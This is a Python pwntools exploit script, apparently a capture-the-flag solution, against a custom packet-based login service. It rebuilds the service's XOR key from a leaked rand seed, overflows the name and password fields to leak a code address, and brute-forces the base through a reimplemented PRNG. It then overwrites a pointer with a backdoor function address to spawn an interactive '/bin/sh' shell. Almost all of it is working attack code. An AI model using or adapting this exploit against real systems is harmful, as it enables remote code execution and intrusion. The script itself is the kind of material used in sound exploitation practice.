from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')

p = remote('10.2.132.159', 9999)

key = []
def genkey(seed):
    clibc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
    clibc.srand(seed)
    for i in range(16):
        key.append(clibc.rand())

    
def encrypto(pkt):
    enc_pkt = b''
    n = 0 
    m = 0
    for i in pkt:
        tmp = (i ^ (p32(key[n % 16])[m % 4])).to_bytes(1, 'big')
        enc_pkt += tmp
        if m % 4 == 0:
            n += 1
        m += 1
    return enc_pkt

def decrypto():
    return None
    

def gen_login(len1, name_passwd, uid):
    return p32(0x01000000)+p32(0)+p32(len1, endian='big')+name_passwd+uid

def gen_show(uid):
    return p32(1, endian='big')+p32(1, endian='big')+uid

def gen_logout():
    return p32(1, endian='big')+p32(2, endian='big')

def get_base(check):
    for base in range(0x0, 0xfffff000, 0x1000):
        init_scmgr = base + 0x18a0
        g_table = [init_scmgr]
        for i in range(31):
            init_scmgr = (init_scmgr * 69069) & 0xffffffff
            g_table.append(init_scmgr)

        g_index = 0
        v0 = (g_index-1) & 0x1f
        v2 = g_table[(g_index + 3) & 0x1f] ^ g_table[g_index] ^ (g_table[(g_index + 3) & 0x1f] >> 8)
        v1 = g_table[v0]
        v3 = g_table[(g_index + 10) & 0x1F]
        v4 = g_table[(g_index - 8) & 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) & 0x1F])) << 14)
        v4 = v4 & 0xffffffff
        g_table[g_index] = v2 ^ v4
        g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (16 * (v1 ^ 4 * v4))) << 7)) & 0xffffffff
        g_index = (g_index - 1) & 0x1F
        if(g_table[g_index] == check):
            print ("base: ", hex(base))
            return base

p.recvuntil("Begin connect: ")
seed = int(p.recvline().strip())
print("seed: ",seed)

name_passwd = b'a'*0x150+b':'+b'b'*0x178+b'xxxxxxxx'+b';'
genkey(seed)

len1 = len(name_passwd)-0x20
pkt = gen_login(len1, name_passwd, b'u'*8)
enc_pkt = encrypto(pkt)
p.sendlineafter("Input manager packet: \n", enc_pkt)

pkt = gen_show(b'u'*8)
enc_pkt = encrypto(pkt)
p.sendlineafter("Input manager packet: ", enc_pkt)
p.recvline()
data = p.recvline()

low_puts_addr = u32(data[-7:-3])
high_puts_addr = u16(data[-3:-1])
base = get_base(low_puts_addr)

text_base = (high_puts_addr<<32)+base
print("text_addr: ",hex(text_base))

printf_got = text_base + 0x1080
backdoor_func = text_base + 0x1060 
print("func_addr: ",hex(printf_got))

pkt = gen_logout()
enc_pkt = encrypto(pkt)
p.sendlineafter("Input manager packet: ", enc_pkt)

p.recv()

# gdb.attach(p)
fp = b'/bin/sh\n'
name_passwd = b'a'*0x180+b':'+fp+b'b'*(0x180-len(fp))
lene1 = len(name_passwd)-0x20
pkt = gen_login(len1, name_passwd, p64(backdoor_func)[:6]+b';')
enc_pkt = encrypto(pkt)
p.sendlineafter("Input manager packet: ", enc_pkt)

pkt = gen_show(p64(0x0))
enc_pkt = encrypto(pkt)
p.sendlineafter("Input manager packet: ", enc_pkt)

p.recv()
p.interactive()